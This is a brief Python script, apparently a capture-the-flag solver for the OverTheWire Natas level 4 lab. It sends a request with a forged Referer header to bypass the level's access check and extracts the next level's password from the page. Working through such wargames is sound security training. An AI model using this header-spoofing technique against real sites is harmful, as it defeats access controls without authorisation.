import requests
from requests.auth import HTTPBasicAuth
import natas3solution

auth = HTTPBasicAuth('natas4', natas3solution.get_pass())
def get_pass():
    head = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}
    r = requests.get('http://natas4.natas.labs.overthewire.org/', auth=auth,headers=head)
    webcontent = r.text
  #  print(webcontent)
    i = webcontent.find('natas5 is')+10
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
